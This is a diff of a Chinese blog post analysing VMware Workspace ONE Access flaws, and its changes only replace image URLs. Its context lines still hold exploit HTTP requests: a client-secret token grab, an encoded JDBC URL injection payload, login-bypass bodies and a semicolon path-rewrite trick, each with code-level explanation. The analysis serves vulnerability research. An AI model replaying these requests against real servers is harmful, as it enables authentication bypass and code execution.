@@ -26,7 +26,7 @@
 
 借用作者的PPT里原图，IAM是指 **Identity 认证**  和  **Access 授权** 管理。这里就简单提一下IAM的概念，具体可以看作者PPT内容。
 
-![image-20220907153138806](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209071531935.png)
+![image-20220907153138806](https://img.sumsec.me/202209/202209071531935.png)
 
 
 
@@ -47,7 +47,7 @@ Content-Length: 0
 
 ```
 
-![image-20220830150826085](https://raw.githubusercontent.com/SummerSec/Images/main/202207/202208301508407.png)
+![image-20220830150826085](https://img.sumsec.me/202207/202208301508407.png)
 
 
 
@@ -67,7 +67,7 @@ Content-Length: 168
 eyJvdGEiOiI0OWQ1ZGQzZS04NTRlLTNhZTUtYjliNC1jNmY1YjU0NTI5YjA6cDdaZG5Ea0xpMTN6TkMzb25UMDVhTDdaYWFFSk95elUiLCJ1cmwiOiJodHRwczovLzE5Mi4xNjguMjQuMTI4LyIsInRpZCI6IlRFU1QifQ==
 ```
 
-![image-20220830151149523](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202208301511628.png)
+![image-20220830151149523](https://img.sumsec.me/202209/202208301511628.png)
 
 
 
@@ -85,7 +85,7 @@ Content-Length: 90
 grant_type=client_credentials&client_id=acs&client_secret=crIWLiwGBwG5UqfH8OeSLPqJdXyKTLGA
 ```
 
-![image-20220830151428326](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202208301514360.png)
+![image-20220830151428326](https://img.sumsec.me/202209/202208301514360.png)
 
 如果将access_token进行jwt解密
 
@@ -151,7 +151,7 @@ Content-Length: 4576
 jdbcUrl=jdbc:postgresql://fCYhc9Bp/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%26socketFactoryArg=yv7a3gAAC7QAAAAIqOpr4c1H0VAAAAAQE1RdixhGW49W7zJBEMllPgAAC5DZOFpIGuqCqGmI9bHabUd%252B%252BOj0jZScmr8PfQEgLXMIJQT9Ih6qG8I9IPn0D%252F7Wx5JgPhMUXsqM20%252BVSp%252BmHXWq4GGAhcDAoEbqCEt7PzQN21wm0F2SbVYzF8qlChAg1HHX7i6DGvVKX1Z5OWOxKQf3qn4L%252BXf4McHAOii62v0zLn61TLtrV41sy5vkhpe92Y%252F1HYFUHpD3pZ4Uozot1xOdhCtnd%252BT74%252FkYg%252FEHLT4g%252BwOuKwi9RW5mc8bomRqfyXlZMpYqmgGXfqOQPnTrqyn6ch9pGgngfmXQA1Qf2FgTa2N9Tmdo5S8biygxBCZX3jP26TltWmMYcWxJ87B0YDrU4SgspPn2VgfZteyoxAykR6DpSwoOUPdAFw5Pb%252FjHqC9DRNLvzv6mWOqn%252FZgjvJYu3WT8BOyu%252Bdc8Eofaq7nPg33QvG0%252FZ7Lc1QlVkKWGr%252BHfUNwr%252F1Se%252FusYB2UYZ9zQm7NVb7uf7QsxF7W85QtjMUQEN6tOHWpSGUrxwSYu9IQWQoXVtqaNIvNe42UrPfNIw3X5L3nZVcDkSt1OD7fneDCX4bVLNqYSntUyQ6K%252F%252FwGJvO8NBciHwfcicRfRkRAsbOKJITN7aeNjrdCEAmYUlA9Vjfn2vnJCp4mW5CFJZlFAJOY92yPX1v8NkAxq9EErlSSA6HRG3u9LQzxWjzQ9KOZBotFRFyr0RECPOf3eUdvlt1zlRZ8QfFj0iwM1U%252Bre72ckkhOxMvjP1vNChCuGmLQP%252FalC3MrKR3mr9aiZ%252BogpCRT2M%252BXtIeqkQKUw9V25Tz6M88ODNHkjLzoPD6T9lBhvxCe1aLTh%252B4DYu4gHyy5xwQlwa79QDIg%252BZqGMjwOBgQP2BHNOC9RNR84TtvuGB3wG2COxY5FUNv%252FIB79lu31cPVALDxE5V9O%252BG7HXGS%252BAIk0C8DVx7J8lsXvz4nX%252BSf3hCRnCVAxbSYRmeiuY4EuwDM7%252F2fXj3bqP97WWs4HvAg1v2%252FEuoGuCrmFw5vRTls7uRr2OumbPxjEJTg6%252Bo5MSiNnBwGGA%252F%252FQUtcxNURXXHO4UApIW6enY617YuTbdhRO0U4jk2Q0jxUYrGcIWDNuEX%252Bx7bXkeuanQbeJa7nbat%252Fv8BOnUZcjYXBRspxH23UGxlWldEv5%252FOyWNfN3PcfpiUuV1%252BsS9NEViEEXe8vmsSzbt619hb4snC%252BxbzGb6t8ZB4pNVrDDdo6OvqAyY1HSLErnR%252F6jiJCvFlzbxCa3HDPcA4mWl5ttyONRENzZoVB%252BB21GxWQ%252Fkk3GyAhRqeylpY7MsjTd5WPN1axL8b5Bu9Yhj81bI1ucik1A%252F2peNYXVI9bNcYV4OHMCOrpuYVS%252BxqtEdndh92Kk7LA8DMt%252B6CBQYZF9g4PHJjoQbGMycVsoe9069K7TnuVX4fF8DKToWenQVGujcYKIylOo7esv3MDEDbR85TTvYhbQpj3%252BA4pbf8C%252BaEQFirvRq5DGrIxswdg1i%252B4uCcO9dbWQaPjPuXyXG9W7OfYngesuQQ8tqeIMz3M4HNWMy6E5fMgv4Z%252FD%252F2%252FtI7p%252Bmq4bB%252BBXiNsp2Y%252FT1y06vZCcdF5Uxt197MDCC0WvlXHAInPztnW3hUd4VgKPZN19GK9JIQUGDLgom7MCDhEO7EJArJNa1DFNKP%252B9P7ryEren6RIQs400Ozcu9kjdy0pfGYm8I2oMPl9AydThSTQg8kfFfELIcuC6uKGKe9qjfZgxJlmU5LLDzsob7XooaFN1hbO7y7ioHH%252Fip8a2YNpxpqzENGR10aw1VE5JvxqI3iaQJSaHFBzE2fpJePCwxoDCHmYKzi79x8lu%252BYlAZ1Z2WHWU7MWkkxpanSZGRYa7ulc%252B4dr5ASZbtyNa%252BNjZPlnlgJF4vKWpQKhubcny63grhXwHrhdfZSTbQiJeF01ee2wMHcRKfNWzud7Yc34DWAm4ar8JLX3%252BDAKWjP0wI4lHgoc6HE7piO9NPMQyAQwE9tfOf414kYyatHviyJNa4jj0Ne6i%252BMFp0YQBxMSgu9kGxtNzQ8Bwdl1LvWEPXD2EfrQFvI8iki40Wm67uAjWnZ4RIoDgt3VcBkYw%252FMlwI5wZK5Yg5mf8LU17%252B06tmP2WZpNK6MeFFcuy5SqfLFX%252Bp%252BZswjwI7M8ZI1Qc9yhuyWoLSOdyYzjCZXOCEmsj46%252BFrDDaBAXj8o6kl94wzy2Q%252B4tPUudNSIVkMR%252B%252B6SzXR%252Bdrnn5yVjdIYET1JUAKMnL1mcKc1gF4ew4dI9JLYW25eZDqC111IaAfRUKKLuepE7LoNqioenxrqIVTRHs4dXgJt8XaezyngyIwHtyCxKgycvU%252B1Z3IAm12lK24aYcRAqF4cV89YHzeSHHLRv9ULffFOV65Q6C4WzqVpJnoJn%252B49DtzPnoICQ2ks9hVM%252F1jEDjfA4KZKpNwY4FcuhzM4CwTbjw1oirdIrqeNU9a0n2RoRM6OsQ9a%252FGJsgji6kaUvXEeOe3gSPLwAywU7GmDxjqyMBd1djZNhn8mn3fxiNM9xPqxQe%252Fx026%252BkQ6xIg5GIl8p22BQ7mW1kTQoU7sHJ44RXB0GNtZ1tGGOpPeqI7IYyS5ic%252B8NEnUSqZdIAjKTz5Q5NuXmCzeAVEVgtzlUBzUn45z6IGSV%252F99uy9IGlzNqWLJvPxIZ5k%252FXA6ilqrVSlZX6iOpbGeQEBhZNFKSfh5GKGDsLHIiCzOscIFcFvBhaBc9THQapOMkiCmjd0qiAMrM%252BtM8EkwGZVNtlAMV9YEe48NaLXfT2QTG15aECZyJEWK7QwwM%252BWuojX%252FHMzyKM4%252FQab8ByyyW7VIi81y6Q2G4MTp0SqW9PbDYHMl1gPpdc8eOC3DVHdfoeiOygD%252FcDLd0Oxyf4J9KnN5B02mrbMQAb8j2B8AlglqsFL6iqnrHTyFRay1qKSPKRNLAMWrS25jRFtTpJXKRH4V9ovkNqh8A404KqG3w4T1loTLzHOcwCvU9p6kIDxFDnmGxwhmE2G3X3h2fDo%252B5kU7Vvs9qgwn6Cfpdr0VZBY7lYtQATefnPTi1kTyOz3ClifqpBBfFhXtBDNxZv34z%252BDckpNL8YbiAXP%252Frslkx6UunUJQvfEkJ96m4fCZFIKnERdAW70oU%252FKlqX4UD3dGUHO%252BpvaE7edFlLco1irRJWQfnvgJXYxaWtGXm9DwuDflf2ipTZb2nEbGs6Y3FkKi57Ar6O11CxarFg8It1pj9I6uRvu889MPTZjWeejGnusQBVTqYhspXLRAqed1EF%252BV6QEJ1MQNjhl3uyVFVu0ui1aXUTnZ7LC0uS1V2al2BZvzAfWDUDirJYXe3NomnXsLKj0l0fGsltU2XIgZlj4zDdGywc3YSZsudnid8v6JFdkgfRoG92qAZx99jAlufZEFFVj9sxzRrSd3RpvYu3sHOiqQD0iQxqIFg%252FvtYEcqKGBk%252FpPdO65M8qEXJDuRVva4NVHBOt5x60pFDsyWp2p4nFtrjfMFjluSxq8iOwnCsiCHzxxN2RwwNIzgUFLJDg%252BtrLcHNptYbCq2p8kRTo7%252BtZ97LBUm9WVpXuXQR31AGkiptzJGhYXZMvXaWeHQa8hVuAvHyBc9X5%252B9xOab%252BVq2U6zy3YJji6ieOj4PC1JKKiX0VbUmJOpVBA9lH77etM1KJOS%252F1wUpDorG%252BWZc2evUtTP4eiOAhUP3UI1a1iXeiRD8qX9tCYsyP8AYS0QVwPHizT2p5sJ8xsbMwb5iBE42WvupGo1RK1M1NBFxdFbmgW76iTKalo8n1Q9HrfJprAH49zTYgNAtFMRwmEWJdJ%252BBGmzVFLwL5J%252FngN2JwP1c%252BVgWrJuZ6Mllqu774%252BdDEpRXiXb%252BwmI%252B6Gou4kDNdTbLjEeGd1li0akHxl7oqt4SAMC0wzoR7CqwXzbCFLZ54yWTOLl5GXcaO2FEdVqTGMz3iP1WFtQWzh6P90cYroK3KLnscsKKg72%252Fj8y0YtG5RHKbF3kQqVrFA%253D%253D&dbUsername=&dbPassword=
 ```
 
-![image-20220830151615968](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202208301516002.png)
+![image-20220830151615968](https://img.sumsec.me/202209/202208301516002.png)
 
 
 
@@ -161,15 +161,15 @@ jdbcUrl=jdbc:postgresql://fCYhc9Bp/saas?socketFactory=com.vmware.licensecheck.Li
 
 **/SAAS/API/1.0/REST/oauth2/generateActivationToken/acs**接口对应漏洞代码/SAAS/WEB-INF/classes/com/vmware/horizon/rest/controller/oauth2/OAuth2TokenResourceController.class
 
-![image-20220906171756616](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061717691.png)
+![image-20220906171756616](https://img.sumsec.me/202209/202209061717691.png)
 
 VMWare Workspace ONE Access 默认安装之后，会默认存在id为acs的Client。
 
-![image-20220906171556742](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061715846.png)
+![image-20220906171556742](https://img.sumsec.me/202209/202209061715846.png)
 
 **/SAAS/API/1.0/REST/oauth2/activate** 会根据传入的activationCode返回密钥
 
-![image-20220906172705858](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061727041.png)
+![image-20220906172705858](https://img.sumsec.me/202209/202209061727041.png)
 
 
 
@@ -206,11 +206,11 @@ Connection: close
 protected_state=eyJzaWciOiJ7XCJzaWduYXR1cmVCNjRcIjpcIkRaY1JhQ0o4MHJMcjcrNW5teTFZVG1CaDM3bk1SSXdFa1NHWGxhY0JRTVNPOWNwMjJuOURiUjQ3OVZEbVlZQlhBS253MldjUmNEUlBrWFcwWmVHUkt0QnVNMkJzeGlqOU1tVkJTRzhkNXFNR09ZVm5lN1RWRVpDSXFGc3RQczBEdHovOFpWOGpoYU9WZkxEd241cWxOVExFOHZDeUhrQzlmcUJpbzNPYmxpbGI1Q1k1blFxMSthV3JDQlRvVFlZbWZUYTRXQlIycjI5OTN6UjRYNG84SmZlUFRGc3Q2bUZGZXNEa0cwaW5xekxvSElMVzFMbzdxME1KOXJjUWtFNndqWlBYZjFlRjRmQi8wZFJSZTdLQkQ3RW9jTk05djJpOFlEbGNSV0IyZm10cnppeEloM3IrWnltc3o0M3U4ZFhVYWFRUUx2S2pTS2VEam93NVdpMWZxRWM2MHFkTGc1anh2alBadDNHVDRzZkhxWDNTSkh1Qm54aCtTS2wzMHBVV0F4QWV0dWFqcFNNWGs1UzZuQTUxTUhYNitwbTNxb3pqb20zYnU2bHdZQnhMSGk1UWtnSnRPeEx0Q0JVcjlzREpBRlZGYmNZQXhRM0JoQ1BWNmF5NUtBdnl2Zmt6eFA1MEtaM1c2RXdScWNNeFZJYnBmRkwrOGlPaEh3TzZhaC8xb1FIT09DdE8rdmhoNmlVclVGQ29LcCtsdnZUMmxWTXV4WTF1TEgrb3kvcU1nRCtRSkh5dWpBOCs0TDBpbWlBZXc5UVJzUDdFT3Y3YU9xeS9oU2NhT1BiUVhyRmt2YWJWUkJOaUw2YUpKYk5rRFlCSHg0S0o4OU9XWGE4MElpT1JaeFFyWTgvNm5PZVh0Q2xFRHNZN2ZreitiN2dCeVNjQnZhY2xsNzdZRWh3PVwiLFwiYWxnb3JpdGhtXCI6XCJTSEEyNTZ3aXRoUlNBXCIsXCJrZXlSZWZcIjpcImRiMjA5OWJmLWFmNDYtNGU0MC05YjAzLThhMDc0ZTZiNjcyMVwiLFwiZGF0YUI2NFwiOm51bGx9IiwidmFsIjoie1wiYXV0aG5Db250ZXh0XCI6XCJcIixcImRvbWFpblwiOlwiU3lzdGVtIERvbWFpblwiLFwidXNlck5hbWVUZXh0RmllbGRSZWFkb25seVwiOlwiZmFsc2VcIixcIm51bUF0dGVtcHRlZFwiOlwiMFwifSJ9&userstore=System+Domain&username=admin&password=asd&userstoreDisplay=System+Domain&horizonRelayState=e798ec60-1a93-4779-ad37-d8156260d3d2&stickyConnectorId=&action=signIn&LOGIN_XSRF=CFtnkwKqzk6xgmu
 ```
 
-![image-20220830172655870](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202208301726115.png)
+![image-20220830172655870](https://img.sumsec.me/202209/202208301726115.png)
 
 如果host的域名旗下路径/SAAS/API/1.0/REST/auth/local/login能够被正常解析，则会返回token进而绕过登录认证。这里使用正常的dnslog平台不行，可以使用burp自带的dnslog或者构造一个页面，状态码返回200即可。
 
-![image-20220830184826015](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202208301848128.png)
+![image-20220830184826015](https://img.sumsec.me/202209/202208301848128.png)
 
 ---
 
@@ -222,11 +222,11 @@ protected_state=eyJzaWciOiJ7XCJzaWduYXR1cmVCNjRcIjpcIkRaY1JhQ0o4MHJMcjcrNW5teTFZ
 grep -irn "asdasd" -A 200 -B 10
 ```
 
-![image-20220906174414211](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061744336.png)
+![image-20220906174414211](https://img.sumsec.me/202209/202209061744336.png)
 
 **/SAAS/auth/login/embeddedauthbroker/callback**接口对应代码**/embeddedauthadapters/local-password-auth-adapter-0.1.jar!/com/vmware/horizon/adapters/local/LocalPasswordAuthAdapter.class**
 
-![image-20220906174702552](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061747647.png)
+![image-20220906174702552](https://img.sumsec.me/202209/202209061747647.png)
 
 **getLocalUrl方法**中调用**request.getServerName(), request.getServerPort()**获取主机和端口，两个方法是从Host获取主机和端口。如果主机为域名则为域名，IP则为IP。
 
@@ -246,11 +246,11 @@ private String getLocalUrl(HttpServletRequest request) {
 ```
 
 
-最终获取到url值为**https://{host}:{port}/SAAS/API/1.0/REST/auth/local/login**，然后会调用**authenticate方法**进行认证。![image-20220906175139592](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061751629.png)
+最终获取到url值为**https://{host}:{port}/SAAS/API/1.0/REST/auth/local/login**，然后会调用**authenticate方法**进行认证。![image-20220906175139592](https://img.sumsec.me/202209/202209061751629.png)
 
 **/embeddedauthadapters/local-password-auth-adapter-0.1.jar!/com/vmware/horizon/adapters/local/LocalPasswordService.class** 的authenticate方法会请求传入的URL，如果**返回状态码为200就返回true**，认证成功。
 
-![image-20220906175324938](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061753030.png)
+![image-20220906175324938](https://img.sumsec.me/202209/202209061753030.png)
 
 ---
 
@@ -272,7 +272,7 @@ Connection: close
 protected_state=eyJzaWciOiJ7XCJzaWduYXR1cmVCNjRcIjpcIloxRHhvMU9vd0RQakFNdy9hQ1c0M0ZmSmNpdXNUQnFUMEppV1J1V0E0RkVVdEJObEJmem91eDdRUzJ3bGJPeXhXSW5yRmZVT2FLYWgwb3VGNkxPN0xiMStFTTFUWGUzZW5BamlkdnN1UDVQZmRFdkxhdWwreEk1TFFybWVISG5ISEk0OXk3Q1prTEtGSis0c3N3SWlzTFg5bkMxWjJLcW9rck9CSzNPYmJ2U09Oeko3NFJva3creWJNSk5ma3M3R21zeE5KVDNydFZLVmVRV0o1U2RUTStNKzJ1bWlRd1JyREtWdGxDc0dLZ2xKa3ZFVldJZXRYN0tYLzVVOEZXa2c1UTYrN0xsQjhMcXBRdklaK05KOHlJRTZRMDY4ejJSR2NUZG9JUU1Zc01oV2lNSVV0dHdKUWY2MGduUHliaHQ0Zm13Z2wxVlJPMGwySHNWRW0vMTYzbmNtd3Bjd2s4b0VpQ21yME9tekFrL0JxWU5lTlBqTUdxRU54T3pBdUdISGlhZVlvbTRCR25JRjkwRko5MVMyR3dWNkM0L3NKWmRUc3g2YlpJN2hIeVZIM0FpVXdObzlwSmwxcllZOUZxUTNINzlBN0t2SzM5RDdoRldDR3duVmphaHFXL1VSSmNMSUFBMCtNZzJ6NmMxdUNwbUx4SEtRT3NuQTkzSEt4dlRpNkY1eGJRb1hrcWFLQnZuNEkxZHdKS1JpQ1RNbDRSckJlZ3V0bTI1NGJoNFZMZ0VQU01KYUlWc1YyL1VFU0RRWWMzbEwvaFFJWHpTRllQY2RSVDd0Z2JOSUM0Q3JDb0VWRmRuZEZMUjBKSnFGU28yTUJ4ZTBZNEwxYi9zc0ttZzMra3VQMFRHY2tWZFNsU2xzYXFnckRxTWFmVkhtR0RTMlJWb0RoNG5zY3NZPVwiLFwiYWxnb3JpdGhtXCI6XCJTSEEyNTZ3aXRoUlNBXCIsXCJrZXlSZWZcIjpcImRiMjA5OWJmLWFmNDYtNGU0MC05YjAzLThhMDc0ZTZiNjcyMVwiLFwiZGF0YUI2NFwiOm51bGx9IiwidmFsIjoie1wiYXV0aG5Db250ZXh0XCI6XCJcIixcImRvbWFpblwiOlwiU3lzdGVtIERvbWFpblwiLFwidXNlck5hbWVUZXh0RmllbGRSZWFkb25seVwiOlwiZmFsc2VcIixcIm51bUF0dGVtcHRlZFwiOlwiMlwifSJ9&userstore=System+Domain&username=admin&password=admin&userstoreDisplay=System+Domain&horizonRelayState=d7c0110d-cd93-4cd5-809b-f20f0befb36e&stickyConnectorId=&action=signIn&LOGIN_XSRF=aJJ4le9kzKf9ZM9
 ```
 
-![image-20220906145351505](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061453785.png)
+![image-20220906145351505](https://img.sumsec.me/202209/202209061453785.png)
 
 ---
 
@@ -280,11 +280,11 @@ protected_state=eyJzaWciOiJ7XCJzaWduYXR1cmVCNjRcIjpcIloxRHhvMU9vd0RQakFNdy9hQ1c0
 
 首先会经过**UrlRewriteFilter** /SAAS/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/UrlRewriteFilter.class
 
-![image-20220906145736837](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061457923.png)
+![image-20220906145736837](https://img.sumsec.me/202209/202209061457923.png)
 
 在跳转到/ROOT/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/NormalRule.class的Path **/t/_/;/auth/login/embeddedauthbroker/callback**这里经过正则匹配之后就变成了**/;/auth/login/embeddedauthbroker/callback**。
 
-![image-20220906151403872](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061514006.png)
+![image-20220906151403872](https://img.sumsec.me/202209/202209061514006.png)
 
 代码匹配实现逻辑demo
 
@@ -302,31 +302,31 @@ protected_state=eyJzaWciOiJ7XCJzaWduYXR1cmVCNjRcIjpcIloxRHhvMU9vd0RQakFNdy9hQ1c0
     }
 ```
 
-![image-20220906155950840](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061559914.png)
+![image-20220906155950840](https://img.sumsec.me/202209/202209061559914.png)
 
 下一步跳转到/ROOT/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/RuleExecutionOutput.class，将url进行替换。**并同时调用setRedirect方法，设置为true。**
 
-![image-20220906151807338](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061518384.png)
+![image-20220906151807338](https://img.sumsec.me/202209/202209061518384.png)
 
 在最终返回到/SAAS/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/RuleChain.class此时**/t/_/;/auth/login/embeddedauthbroker/callback**彻底变成了**/;/auth/login/embeddedauthbroker/callback**。
 
-![image-20220906152022147](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061520211.png)
+![image-20220906152022147](https://img.sumsec.me/202209/202209061520211.png)
 
-在调用handlerRewrite方法![image-20220906152126258](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061521295.png)
+在调用handlerRewrite方法![image-20220906152126258](https://img.sumsec.me/202209/202209061521295.png)
 
 handlerRewrite方法调用doRewrite方法到/SAAS/WEB-INF/lib/urlrewritefilter-4.0.4.jar!/org/tuckey/web/filters/urlrewrite/NormalRewrittenUrl.class
 
-![image-20220906152213095](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061522154.png)
+![image-20220906152213095](https://img.sumsec.me/202209/202209061522154.png)
 
 这里isForward是前面掉用了etRedirect方法，设置为true。forward转发之后不再继续走filter，跳过了HostHeaderFilter过滤，并且经过getRequestDispatcher之后servletPath变为**/auth**，分号被去除，完美绕过。后续漏洞逻辑是Authentication Bypass RCE CVE-2022-22972。至于分号为什么会去除，这里是tomcat的**getRequestDispatcher**方法特性。
 
-![image-20220906152522028](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061525061.png)
+![image-20220906152522028](https://img.sumsec.me/202209/202209061525061.png)
 
-![image-20220906153525645](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061535714.png)
+![image-20220906153525645](https://img.sumsec.me/202209/202209061535714.png)
 
 tomcat的**getRequestDispatcher**方法特性，会取第一个**/**后面的路径作为servletPath。
 
-![image-20220906160409156](https://raw.githubusercontent.com/SummerSec/Images/main/202209/202209061604250.png)
+![image-20220906160409156](https://img.sumsec.me/202209/202209061604250.png)
 
 
 
